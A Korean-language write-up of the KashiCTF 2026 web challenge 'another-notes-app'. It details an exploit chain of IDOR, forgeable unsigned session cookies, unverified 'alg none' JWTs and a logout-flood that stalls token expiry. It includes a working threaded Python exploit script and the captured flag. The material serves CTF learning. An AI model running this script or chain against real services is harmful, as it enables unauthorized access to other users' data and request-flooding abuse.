---
ctf_name: "KashiCTF 2026"
challenge_name: "another-notes-app"
category: "web"
difficulty: "hard"
author: "oscarjhk"
date: "2026-04-03"
tags: ["Ktor", "JWT", "Session", "Logic Bug", "Race Condition"]
---

# another-notes-app

## 문제 설명

`Authored this chall a while ago, I have long forgotten the description.`

## 풀이

### 분석

회원가입이나 로그인에 성공하면 `JwtConfig.generateToken()`으로 JWT를 발급하고, 그 토큰을 `TokenCache` 메모리 캐시에 저장한다.
이후 요청에서는 세션 쿠키에서 token 문자열을 꺼낸 뒤 `tokenCache.verifyToken(session.token)`로 캐시에 존재하는지만 확인한다.
즉 실제 인증 여부는 서버 메모리 안의 `TokenCache` 상태에 의해 결정된다.

`JwtConfig.kt`를 보면 토큰 유효시간은 3분이다.
`private const val validityInMs = 3 * 60_000`로 설정되어 있다.

세션 설정은 `Application.kt` 다음과 같다.

```kotlin
install(Sessions) {
    cookie<UserSession>("SESSION") {
        cookie.path = "/"
        cookie.maxAgeInSeconds = 36000
    }
}
```

`SESSION` 쿠키 값은 클라이언트가 그대로 읽고 수정할 수 있는 평문 JSON이다.
실제로 회원가입 후 받은 쿠키는 URL 인코딩된 형태이지만 내용은 다음과 같다.

```json
{"token":"<jwt>"}
```

현재 로그인한 세션을 확인한 뒤, 폼에서 `username` 값을 다시 받아서 그 사용자의 노트를 내려준다.
이때 현재 로그인한 사용자와 `username`이 같은지 확인하지 않는다.

즉 내 계정으로 로그인한 상태에서 `username=owner`로 요청하면 owner 노트를 받을 수 있다.

그리고 다운로드에는 시간 제한이 걸려 있다.
다운로드 요청 직후 바로 파일을 주는 것이 아니라 5분 뒤에 받을 수 있도록 `downloadPermissions[session.token]`에 준비 시간을 기록한다.
토큰 유효시간은 3분이므로, `owner` 다운로드를 걸어 두고 기다리면 세션이 먼저 만료된다.

`TokenCache.start()`는 별도 코루틴에서 무한 루프를 돌며 캐시를 관리한다.

동작 흐름은 다음과 같다.
먼저 logout 채널에 쌓인 토큰들을 전부 꺼내서 `processLogoutInline()`으로 처리한다.
그 다음 5초 동안 대기한다.
그 다음 현재 시각을 기준으로 만료된 토큰들을 캐시에서 제거한다.

즉 만료 정리는 logout 채널이 비워진 뒤에만 실행된다.
logout 채널이 계속 차 있으면 만료 토큰 제거 단계까지 내려가지 못한다.

`/logout` 라우트도 살펴보면 세션에서 token 문자열만 꺼내서 바로 `tokenCache.processLogout(it)`로 넘긴다.
여기에는 JWT 서명 검증이 없다.
세션 쿠키가 파싱되기만 하면 그 안의 token 값은 그대로 logout 채널에 들어간다.

`processLogoutInline()`는 `JwtConfig.parseWithoutValidation(token)`을 사용한다.
signed JWT를 검증하지 않고 header와 payload만 파싱한다.
즉 JWT 형식만 맞으면 unsigned token도 받아들인다.

세션 쿠키는 위조할 수 있고, logout 처리에서는 서명 검증도 하지 않으므로, 공격자는 임의의 token 문자열을 담은 세션 쿠키를 만들어 `/logout`에 무한히 보낼 수 있다.
이때 사용하는 token은 실제 인증에 통과할 필요가 없고, 단지 JWT 모양만 맞으면 된다.

`TokenCache`에 저장된 토큰만 통과하기 때문에 이 토큰은 `/notes` 같은 페이지에서는 인증 토큰으로 사용할 수 없다.
하지만 `/logout`에는 충분하다.
세션 쿠키만 파싱되면 큐에 들어가고, 큐 처리에서는 서명 검증 없이 payload를 읽기 때문이다.

정상 세션으로 `owner` 다운로드를 예약한다.
위조 세션 쿠키를 사용해 `/logout` 요청을 대량으로 보내 logout 채널을 계속 점유한다.
그 결과 만료 토큰 정리 루프가 밀리면서 내 정상 토큰이 3분이 지나도 캐시에 남는다.
5분이 지난 뒤 다시 정상 세션으로 `owner` 다운로드를 요청하면 owner 노트를 읽을 수 있다.

### 취약점

`/notes/request-download`는 현재 로그인한 사용자가 아니라 사용자가 제출한 `username` 값을 신뢰한다.
따라서 내 세션으로 owner의 노트를 요청할 수 있다.

`cookie<UserSession>("SESSION")`를 기본 설정으로만 사용하고 있어서 세션 값이 서명되지 않는다.
따라서 사용자는 원하는 token 값을 넣은 세션 쿠키를 자유롭게 만들 수 있다.

`processLogoutInline()`은 `parseWithoutValidation()`을 사용하므로 unsigned JWT도 그대로 처리한다.

logout 큐를 먼저 모두 비우고 나서야 만료 토큰을 제거하므로, 공격자가 logout 큐를 지속적으로 채우면 만료 토큰 제거가 지연된다.

이 네 가지가 연결되면서 3분짜리 정상 세션을 5분 이상 유지할 수 있고, 결국 owner 다운로드를 받을 수 있다.

### 익스플로잇

실제 exploit 흐름은 다음과 같다.

먼저 아무 계정이나 생성해서 정상 `SESSION` 쿠키를 하나 받는다.
그 다음 그 정상 세션으로 `/notes/request-download`에 `username=owner`를 넣어 다운로드를 예약한다.

이후 별도 스레드 여러 개를 사용해서 `/logout`를 계속 호출한다.
이때 사용하는 쿠키는 정상 세션이 아니라 위조 세션 쿠키다.
쿠키 안에는 unsigned JWT를 넣어도 된다.
이 요청들의 목적은 인증 우회가 아니라 logout 큐를 계속 비워지지 않게 만드는 것이다.

정상 세션 쪽에서는 주기적으로 `/notes`를 호출해 세션이 아직 살아 있는지 확인한다.
원래라면 180초가 지나면 `/login?error=Session expired`로 리다이렉트되어야 한다.
하지만 logout 요청을 충분히 많이 보내면 180초 이후에도 `/notes`가 계속 200을 반환한다.
이 상태에서 300초를 넘긴 뒤 다시 `/notes/request-download`를 `username=owner`로 호출하면 owner 노트가 그대로 내려온다.

익스코드
```python
import random
import string
import threading
import time
from urllib.parse import quote

import requests
from requests.adapters import HTTPAdapter

BASE = "http://34.126.223.46:18585"
THREADS = 20

counts = [0] * THREADS
stop = threading.Event()

fake_cookie = quote(
    '{"token":"eyJhbGciOiJub25lIn0.eyJzdWIiOiJvd25lciJ9."}',
    safe="",
)


def make_session():
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0, pool_block=True)
    s.mount("http://", adapter)
    return s


def logout_flooder(idx):
    s = make_session()
    while not stop.is_set():
        s.post(
            BASE + "/logout",
            headers={"Cookie": f"SESSION={fake_cookie}", "Connection": "keep-alive"},
            allow_redirects=False,
            timeout=5,
        )
        counts[idx] += 1


main = make_session()
username = "u" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))

main.post(
    BASE + "/register",
    data={"username": username, "password": "pw123456"},
    allow_redirects=False,
    timeout=10,
)

main.post(
    BASE + "/notes/request-download",
    data={"username": "owner"},
    timeout=10,
)

threads = [threading.Thread(target=logout_flooder, args=(i,), daemon=True) for i in range(THREADS)]
for t in threads:
    t.start()

time.sleep(305)

r = main.post(
    BASE + "/notes/request-download",
    data={"username": "owner"},
    timeout=10,
)

print(r.text)
stop.set()
```

실제 공격 중에는 180초 이후에도 `/notes`가 계속 200으로 응답하는 것을 확인할 수 있었다.
이것으로 만료 정리가 지연되고 있음을 확인한 뒤, 5분이 지난 시점에 최종 다운로드를 수행했다.

## 플래그

```text
kashiCTF{67358e160ab0c131916f0c05aebf8aff_6UHi0hRHSF}}
```

## 배운 점

토큰 만료 시간이 짧다고 해서 항상 세션이 그 시간 안에만 유효한 것은 아니다.
실제 서비스가 토큰을 어떤 방식으로 저장하고 정리하는지에 따라, 논리적으로는 만료된 토큰이 더 오래 살아남을 수 있다.

또한 세션 쿠키 위조가 곧바로 인증 우회로 이어지지 않더라도, 다른 보조 기능과 결합되면 충분히 치명적인 exploit 체인이 만들어질 수 있다.
이 문제에서는 위조 가능한 세션 쿠키가 logout 큐 조작에 사용되었고, 그 결과 원래는 불가능해야 하는 시간차 우회가 가능해졌다.